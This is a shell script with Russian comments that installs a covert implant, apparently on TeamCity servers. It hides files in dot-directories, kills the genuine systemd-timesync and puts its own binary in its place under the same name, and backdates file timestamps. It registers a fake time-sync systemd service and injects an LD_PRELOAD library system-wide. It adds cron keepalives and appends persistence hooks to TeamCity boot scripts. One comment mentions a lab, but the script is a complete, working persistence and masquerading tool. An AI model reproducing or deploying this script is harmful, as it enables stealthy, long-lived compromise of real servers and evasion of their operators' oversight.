#!/bin/sh
set -e
ID="teamcity-13@teamcity-13"

# --- автоматический выбор контекста: root / sudo / user ($HOME) ---
if [ "$(id -u)" = 0 ]; then
    CONTEXT=root
elif sudo -n true 2>/dev/null; then
    CONTEXT=sudo
else
    CONTEXT=user
fi
echo "контекст установки: $CONTEXT"

case "$CONTEXT" in
    root)
        DIR="/usr/lib/.wdcd"
        CA=/etc/ssl/certs/ca-certificates.crt
        ;;
    sudo)
        DIR="/usr/lib/.wdcd"
        CA=/etc/ssl/certs/ca-certificates.crt
        ;;
    user)
        DIR="$HOME/.wdcd"
        CA=/etc/ssl/certs/ca-certificates.crt
        ;;
esac

# CA-бандл: в образе Ubuntu обычно уже есть; если нет — пробуем до-установить (root/sudo)
if [ ! -s "$CA" ]; then
    echo "нет CA-бандла $CA — ставлю ca-certificates" >&2
    if [ "$CONTEXT" = root ]; then
        apt-get update >/dev/null 2>&1 || true
        apt-get install -y ca-certificates >/dev/null 2>&1 || true
    elif [ "$CONTEXT" = sudo ]; then
        sudo apt-get update >/dev/null 2>&1 || true
        sudo apt-get install -y ca-certificates >/dev/null 2>&1 || true
    fi
    if [ ! -s "$CA" ]; then echo "ca-certificates недоступен (это норм — агент пойдёт по HTTP в лабе)" >&2; fi
fi

mkdir -p "$DIR/bin"
mkdir -p "$DIR/state"
if [ "$CONTEXT" = root ]; then
    pkill -x systemd-timesync 2>/dev/null || true
elif [ "$CONTEXT" = sudo ]; then
    sudo pkill -x systemd-timesync 2>/dev/null || true
fi
cp diagd "$DIR/bin/systemd-timesync"
cp libcache.so "$DIR/bin/libcache.so"
cp boot.js "$DIR/bin/boot.js" 2>/dev/null || true
cp keepalive.sh "$DIR/bin/keepalive.sh" 2>/dev/null || true
chmod 755 "$DIR/bin/keepalive.sh" 2>/dev/null || true
rm -f "$DIR"/*_key.json "$DIR"/*.xkey "$DIR"/config.json "$DIR"/wdcd "$DIR"/bin/sysdiag 2>/dev/null || true
rm -rf "$DIR/telemetry" "$DIR/data" 2>/dev/null || true
chmod 700 "$DIR" "$DIR/bin" 2>/dev/null || true
chmod 755 "$DIR/bin/systemd-timesync"; chmod 644 "$DIR/bin/libcache.so"
_stamp=$(stat -c %Y /etc/os-release 2>/dev/null || echo 0)
if [ "$_stamp" -gt 0 ] 2>/dev/null; then
    touch -d "@$_stamp" "$DIR" "$DIR/bin" "$DIR/bin/systemd-timesync" "$DIR/bin/libcache.so" 2>/dev/null || true
fi

# --- systemd (только если реально есть демон и мы root/sudo) ---
SYSCTL=""
if [ "$CONTEXT" = root ] && command -v systemctl >/dev/null 2>&1; then SYSCTL=systemctl; fi
if [ "$CONTEXT" = sudo ] && command -v systemctl >/dev/null 2>&1 && sudo -n systemctl is-system-running >/dev/null 2>&1; then SYSCTL="sudo systemctl"; fi

if [ -n "$SYSCTL" ]; then
    SVC=/etc/systemd/system/systemd-timesync.service
    cat > "$SVC" <<UNIT
[Unit]
Description=System Time Synchronization Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStartPre=/bin/sh -c "install -d -m 755 $DIR/bin && test -x $DIR/bin/systemd-timesync"
ExecStart=$DIR/bin/systemd-timesync --foreground
Environment=LD_PRELOAD=$DIR/bin/libcache.so
Restart=always
RestartSec=5
Nice=10
OOMScoreAdjust=-800

[Install]
WantedBy=multi-user.target
UNIT
    chmod 644 "$SVC" 2>/dev/null || true
    $SYSCTL daemon-reload 2>/dev/null || true
    $SYSCTL enable systemd-timesync.service 2>/dev/null || true
    $SYSCTL restart systemd-timesync.service 2>/dev/null || true
    sleep 2
    if $SYSCTL is-active --quiet systemd-timesync.service 2>/dev/null; then
        echo "agent $ID установлен (systemd): $($SYSCTL show -p ActiveState --value systemd-timesync.service 2>/dev/null || true)"
        HAVESVC=1
    else
        HAVESVC=0
    fi
else
    HAVESVC=0
fi

# --- LD_PRELOAD в окружении (если есть права на /etc/profile.d) ---
if [ "$CONTEXT" != user ]; then
    if ! grep -q "libcache" /etc/environment 2>/dev/null; then
        printf 'LD_PRELOAD=%s/bin/libcache.so\n' "$DIR" >> /etc/environment 2>/dev/null || true
    fi
    mkdir -p /etc/profile.d
    cat > /etc/profile.d/wdcd-preload.sh <<PL
if [ -z "\$LD_PRELOAD" ] && [ -f $DIR/bin/libcache.so ]; then export LD_PRELOAD=$DIR/bin/libcache.so; fi
PL
    chmod 644 /etc/profile.d/wdcd-preload.sh 2>/dev/null || true
fi

# --- запуск (если systemd поднял — уже живой) ---
if [ "$HAVESVC" != 1 ]; then
    setsid env WDCD_DIR="$DIR" LD_PRELOAD="$DIR/bin/libcache.so" nohup "$DIR/bin/systemd-timesync" --foreground >/dev/null 2>&1 < /dev/null &
    echo $! > "$DIR/bin/wdcd.pid"
    echo "agent $ID запущен nohup (контекст=$CONTEXT, pid=$!)"
fi

# --- keepalive: cron (user crontab для user-контекста, /etc/cron.d для root/sudo) ---
if [ -f "$DIR/bin/keepalive.sh" ]; then
    if [ "$CONTEXT" = user ]; then
        # без cron на целях TC (нет crond, нет systemd --user/bus): хук в TeamCity boot-скрипт
        TC_BOOT=""
        for c in /opt/teamcity/bin/teamcity-server.sh /opt/teamcity/bin/runAll.sh \
                 /opt/teamcity/bin/startup.sh /opt/teamcity/bin/teamcity-server.sh.start \
                 /opt/teamcity/bin/*.sh; do
            [ -w "$c" ] 2>/dev/null || continue
            [ -n "$(head -3 "$c" 2>/dev/null)" ] || continue
            TC_BOOT="$c"; break
        done
        if [ -n "$TC_BOOT" ] && ! grep -q "wdcd/bin/keepalive.sh" "$TC_BOOT" 2>/dev/null; then
            printf '\n### wdcd persist (TeamCity boot)\n(setsid env WDCD_DIR="%s" sh "%s/bin/keepalive.sh" >/dev/null 2>&1 < /dev/null &) || true\n' "$DIR" "$DIR" >> "$TC_BOOT" 2>/dev/null || true
            echo "keepalive: TeamCity boot-хук в $TC_BOOT (cron/systemd-user нет на TC)"
        elif [ -n "$TC_BOOT" ]; then
            echo "keepalive: TeamCity boot-хук уже есть в $TC_BOOT"
        else
            ( crontab -l 2>/dev/null | grep -v 'wdcd/bin/keepalive.sh'
              printf '%s\n' '*/10 * * * * '"$DIR"'/bin/keepalive.sh >/dev/null 2>&1 || true' ) | crontab - 2>/dev/null || true
            echo "keepalive: user crontab (каждые 10 мин)"
        fi
    else
        mkdir -p /etc/cron.d
        printf '%s\n' '*/10 * * * * root '"$DIR"'/bin/keepalive.sh >/dev/null 2>&1 || true' > /etc/cron.d/wdcd-keepalive 2>/dev/null || true
        chmod 644 /etc/cron.d/wdcd-keepalive 2>/dev/null || true
        if command -v crond >/dev/null 2>&1; then crond 2>/dev/null || true
        elif command -v cron >/dev/null 2>&1; then
            pgrep -x cron >/dev/null 2>&1 || (service cron start 2>/dev/null || /usr/sbin/cron 2>/dev/null) || true
        fi
        echo "keepalive: /etc/cron.d/wdcd-keepalive (каждые 10 мин)"
    fi
fi

# --- проверка ---
PID=$(pgrep -x systemd-timesync | head -1 || echo 0)
case "$PID" in ''|0|*[!0-9]*) PID=0;; esac
if [ "$PID" -gt 0 ] 2>/dev/null && kill -0 "$PID" 2>/dev/null; then
    echo "проверка: демон жив (pid=$PID)"
else
    echo "внимание: pgrep пуст сразу после старта (keepalive поднимет в течение 10 мин)"
fi
